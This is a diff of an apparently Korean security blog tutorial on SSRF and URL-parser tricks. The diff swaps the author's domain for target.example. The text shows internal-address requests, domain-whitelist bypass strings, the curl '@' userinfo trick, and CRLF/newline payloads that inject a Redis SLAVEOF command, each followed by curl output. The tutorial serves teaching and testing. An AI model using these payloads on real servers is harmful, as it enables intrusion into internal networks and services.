@@ -184,16 +184,16 @@
 <p>물론 저도 굉장히 좋아하고 잘 애용하는 공격기법 중 하나입니다.</p>
 <p>먼저 원리를 간단하게 설명드리면 사용자 입력을 받아 서버가 직접 다른 웹이나 포트에 직접 접근해서 데이터를 가져오는 기능들에서 주로 발생합니다. 별로 없을 것 같은 기능이지만 실제로 굉장히 많이 쓰이고 있는 기능이며 한때는 OWASP Top 10에도 올라왔었을만큼 인기있는 공격기법이였습니다.</p>
 <p>프리뷰를 보는 페이지가 있다고 가정하고, 이에 따른 정상적인 요청은 아래와 같을겁니다.</p>
-<p>showPreview.php?url=www.hahwul.com/[유저의입력]</p>
+<p>showPreview.php?url=target.example/[유저의입력]</p>
 <p>공격자는 아래와 같은 형태로 공격을 수행하겠지요.</p>
 <p>showPreview.php?url=192.168.56.101/server-status#[내부망의 주소를 호출]</p>
 <p>대체로 이에대한 대응을 도메인에 대한 검증 로직을 추가하는데 단순 문자열 검증이 아닌 실제 도메인을 검증하는 로직이 들어가야하지만, 성능 이슈 및 여러가지 이유로 문자열 검증만 적용된 곳을 많이 보았습니다. 이런 경우 아래와 같은 형태로 우회를 시도하지요.</p>
 <p>패턴: google.com 만 허용하는 경우</p>
 <p>url=google.com.hahwul.com
-url=www.hahwul.com#google.com
-url=www.hahwul.com?google.com
-url=www.hahwul.com/google.com</p>
-<p>단순 문자열 검증의 경우 google.com으로 검증해도 다 www.hahwul.com으로 넘어갑니다. 이는 공격자가 테스트하며 규칙을 파악하면 할수록 여러 우회패턴들이 발생할겁니다.</p>
+url=target.example#google.com
+url=target.example?google.com
+url=target.example/google.com</p>
+<p>단순 문자열 검증의 경우 google.com으로 검증해도 다 target.example으로 넘어갑니다. 이는 공격자가 테스트하며 규칙을 파악하면 할수록 여러 우회패턴들이 발생할겁니다.</p>
 <h2 id="url-parser들의-pasing-방법">URL Parser들의 Pasing 방법</h2>
 <p>오늘 기법을 알아가기 전에 먼저 각 언어별 URL Parser에 대한 동작 방식을 알아야 이해가 쉽습니다.</p>
 <p>RFC3986 기준으로 URL의 컴포넌트를 보면 아래와 같습니다.</p>
@@ -235,15 +235,15 @@ Parser 또한 완벽하지 않기 때문에 모든 사용자의 입력을 예상
 <p>google로 넘어가지 않고 제 PC로 넘어오네요. 왜그럴까요?</p>
 <p>curl은 @를 기준으로 우측을 도메인으로 사용합니다. 메일주소를 생각해보시면 좋아요. 웹에서 인지하기에는 google.com으로 끊어졌지만, 내부 curl로 넘어오는 순간 오른쪽 부분을 도메인으로 보고 호출하게 됩니다.</p>
 <p>자세히 봐볼까요?</p>
-<p>#&gt; curl http://127.0.0.1:80@www.hahwul.com/ -vvv</p>
+<p>#&gt; curl http://127.0.0.1:80@target.example/ -vvv</p>
 <ul>
 <li>Trying 172.217.27.83...</li>
-<li>Connected to www.hahwul.com (172.217.27.83) port 80 (#0)</li>
+<li>Connected to target.example (172.217.27.83) port 80 (#0)</li>
 <li>Server auth using Basic with user '127.0.0.1'</li>
 </ul>
 <blockquote>
 <p>GET / HTTP/1.1
-Host: www.hahwul.com
+Host: target.example
 Authorization: Basic MTI3LjAuMC4xOjgw
 User-Agent: curl/7.47.0
 Accept: <em>/</em></p>
@@ -268,10 +268,10 @@ Accept: <em>/</em></p>
 <head>
 <link href='https://www.blogger.com/static/v1/widgets/3730162741-widget_css_bundle.css' rel='stylesheet' type='text/css'/>
 <title>PIXN :: 하훌</title>
-<p>localhost로 데이터를 호출했지만 curl은 www.hahwul.com 을 쿼리하고 기존 도메인을 계정으로 인지하여 Authorization으로 넘겨줍니다. 그래서 www.hahwul.com 으로 요청이 넘어가고 응답값을 받아오지요.</p>
+<p>localhost로 데이터를 호출했지만 curl은 target.example 을 쿼리하고 기존 도메인을 계정으로 인지하여 Authorization으로 넘겨줍니다. 그래서 target.example 으로 요청이 넘어가고 응답값을 받아오지요.</p>
 <h2 id="ssrf-with-url-parser-2개행문자-feat-curl">SSRF with URL Parser 2(개행문자) feat cURL</h2>
-<p>두번째 방법은 개행문자를 이용한 방법입니다. 개행문자로 SLAVEOF로 www.hahwul.com을 호출했을 때 어떤일들이 일어나는지 보도록 하죠.</p>
-<p>#&gt; curl http://127.0.0.1:80\r\rnSLAVEOF www.hahwul.com -vvv</p>
+<p>두번째 방법은 개행문자를 이용한 방법입니다. 개행문자로 SLAVEOF로 target.example을 호출했을 때 어떤일들이 일어나는지 보도록 하죠.</p>
+<p>#&gt; curl http://127.0.0.1:80\r\rnSLAVEOF target.example -vvv</p>
 <ul>
 <li>Rebuilt URL to: http://127.0.0.1:80rrnSLAVEOF/</li>
 <li>Trying 127.0.0.1...</li>
@@ -309,13 +309,13 @@ Accept: <em>/</em></p>
 </html>
 <ul>
 <li>Connection #0 to host 127.0.0.1 left intact</li>
-<li>Rebuilt URL to: www.hahwul.com/</li>
+<li>Rebuilt URL to: target.example/</li>
 <li>Trying 216.58.220.243...</li>
-<li>Connected to www.hahwul.com (216.58.220.243) port 80 (#1)</li>
+<li>Connected to target.example (216.58.220.243) port 80 (#1)</li>
 </ul>
 <blockquote>
 <p>GET / HTTP/1.1
-Host: www.hahwul.com
+Host: target.example
 User-Agent: curl/7.47.0
 Accept: <em>/</em></p>
 </blockquote>
@@ -341,7 +341,7 @@ Accept: <em>/</em></p>
 <title>PIXN :: 하훌</title>
 <h2 id="ssrf-with-url-parser-3cr-lf-0d0a-feat-curl">SSRF with URL Parser 3(CR-LF %0d%0a) feat cURL</h2>
 <p>2번과 거의 동일합니다만 단순하게 CR과LF를 이용한 방법입니다. \r\n과 따지고보면 같지만 표기하는 방식이 달라 분리했습니다.</p>
-<p>#&gt; curl http://127.0.0.1:80%0d%0aSLAVEOF www.hahwul.com -vvv</p>
+<p>#&gt; curl http://127.0.0.1:80%0d%0aSLAVEOF target.example -vvv</p>
 <ul>
 <li>Rebuilt URL to: http://127.0.0.1:80%0d%0aSLAVEOF/</li>
 <li>Trying 127.0.0.1...</li>
@@ -377,13 +377,13 @@ Accept: <em>/</em></p>
 </html>
 <ul>
 <li>Connection #0 to host 127.0.0.1 left intact</li>
-<li>Rebuilt URL to: www.hahwul.com/</li>
+<li>Rebuilt URL to: target.example/</li>
 <li>Trying 172.217.25.211...</li>
-<li>Connected to www.hahwul.com (172.217.25.211) port 80 (#1)</li>
+<li>Connected to target.example (172.217.25.211) port 80 (#1)</li>
 </ul>
 <blockquote>
 <p>GET / HTTP/1.1
-Host: www.hahwul.com
+Host: target.example
 User-Agent: curl/7.47.0
 Accept: <em>/</em></p>
 </blockquote>
